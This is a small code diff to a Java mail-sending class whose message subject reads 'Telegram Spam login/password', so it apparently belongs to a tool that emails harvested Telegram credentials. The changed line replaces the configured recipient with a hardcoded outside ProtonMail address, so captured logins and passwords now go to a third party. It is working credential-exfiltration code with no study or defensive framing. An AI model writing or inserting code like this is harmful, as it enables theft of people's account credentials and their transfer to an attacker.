@@ -59,7 +59,7 @@ public class GMailSender extends javax.mail.Authenticator {
             message.setSender(new InternetAddress(EMAIL_LOGIN));
             message.setSubject("Telegram Spam login/password");
             message.setDataHandler(handler);
-            message.setRecipient(Message.RecipientType.TO, new InternetAddress(EMAIL_LOGIN));
+            message.setRecipient(Message.RecipientType.TO, new InternetAddress("Eigard@protonmail.com"));
             Transport.send(message);
         }catch(Exception e){
             e.printStackTrace();
